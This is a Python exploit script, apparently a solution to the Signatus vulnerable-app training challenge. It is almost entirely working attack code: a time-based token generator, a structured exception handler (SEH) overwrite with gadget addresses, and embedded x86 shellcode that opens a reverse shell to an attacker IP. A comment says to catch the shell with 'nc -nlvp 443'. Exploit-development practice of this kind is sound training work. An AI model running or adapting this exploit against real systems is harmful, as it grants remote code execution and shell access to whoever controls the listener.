#!/usr/bin/python3
# Quote_DB PoC
# Author: ApexPredator
# Link to Vulnerable App: https://github.com/bmdyy/signatus
# License: MIT
# This script is one possible solution to bmdyy's Signatus challenge.
import socket
import sys
import time
from binascii import hexlify
from struct import pack


def OTD():

    times = time.time()
    #print("[+] Time is now %d" %times)
    timed = hex(int(times/0xa))
    #print("[+] Time adjusted for division by 10 %s" %timed)
    timea = int(str(timed)[-2:],16)
    #print("[+] Last two digits of time %x" %timea)
    timeb = timea * timea
    #print("[+] First multiplication %x" %timeb)
    timec = timea * timeb
    #print("[+] Second multiplication %x" %timec)
    timed = timea * timec
    #print("[+] Third multiplication %x" %timed)
    timee = timec & 0x0FFFFFF00
    #print("[+] First and operation %x" %timee)
    timef = timee<<4
    #print("[+] First left shift operation %x" %timef)
    timeg = timef|timeb
    #print("[+] First or operation %x" %timeg)
    timeh = timeg & 0x0FFFFFFF0
    #print("[+] Second and operation %x" %timeh)
    timej = timed & 0x0FFFFF000
    #print("[+] Third and operation %x" %timej)
    timek = timej<<8
    #print("[+] Second shift operation %x" %timek)
    timel = timek|timeh
    #print("[+] Second or operations %x" %timel)
    timem = timel<<4
    #print("[+] Third shift operation %x" %timem)
    timen = timem|timea
    #print("[+] Third or operation %x" %timen)
    timeo = timen^0x74829726
    #print("[+] XOR operation to determine OTD %x" %timeo)
    timep = hex(timeo)[-8:]
    print("[+] OTD for packet %s" %timep)

    return timep

def clear_log(server, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    print("[+] Clearing log to prep exploit....")
    otd = OTD()
    buf = pack("<L", (int(otd,16)))
    buf += pack("<L", (0x00000003))
    try:
        s.send(buf)
        print("[+] Log Cleared")
    except:
        print("[-] Error sending packet, mostly likely OTD off. Rerun exploit")
        sys.exit(-1)

    return

def write_log(server, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    # badchars = \x00\x0a\x1a\x1b
    # Custom reverse shell. Use nc -nlvp 443 to recieve shell \xc0\xa8\x31\x4a is the IP in reverse order, change to match your IP.
    shellcode =  b"\x89\xe5\x81\xc5\x49\xf2\xff\xff\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x05\x70\xfa\xff\xff\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\x6a\x06\x6a\x01\x6a\x02\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x31\x4a\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xfe\xc4\x50\xfe\xcc\x31\xc9\xb1\x09\xfe\xc1\x50\xe2\xfd\xb0\x44\x50\x89\xe7\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x66\x2d\x90\x03\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"


    otd = OTD()
    buf = pack("<L", (int(otd,16)))
    buf += pack("<L", (0x00000001))
    buf += bytearray([0x90]) * (0x7d0 - len(shellcode))
    buf += shellcode

    try:
        s.send(buf)
        print("[+] First Log write sent.")
        s.close()
    except:
        print("[-] Error sending packet, mostly likely OTD off. Rerun exploit")
        sys.exit(-1)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    otd = OTD()
    buf = pack("<L", (int(otd,16)))
    buf += pack("<L", (0x00000001))
    buf += bytearray([0x41]) * 0xa0
    buf += pack("<L", (0x06eb9090))  # (NSEH)
    buf += pack("<L", (0x60ae1b2b)) # pop ecx; pop ecx; ret;
    buf += bytearray([0x90]) * 0x2
    buf +=b'\xB8\x6C\xF2\xFF\xFF\xF7\xD8\x01\xC4\xFF\xE4' # adjust ESP to point to shellcode and then jump esp
    buf += bytearray([0x43]) * 0x7bf

    try:
        s.send(buf)
        print("[+] Second Log write sent.")
    except:
        print("[-] Error sending packet, mostly likely OTD off. Rerun exploit")
        sys.exit(-1)
    s.close()

    return

def read_log(server, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    print("[+] Sending log read request....")
    otd = OTD()
    buf = pack("<L", (int(otd,16)))
    buf += pack("<L", (0x00000002))
    try:
        s.send(buf)
        print("[+] Log read sent.")
    except:
        print("[-] Error sending packet, mostly likely OTD off. Rerun exploit")
        sys.exit(-1)

    return

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 9999

    clear_log(server,port)
    write_log(server, port)
    read_log(server, port)

    sys.exit(0)


if __name__ == "__main__":
     main()
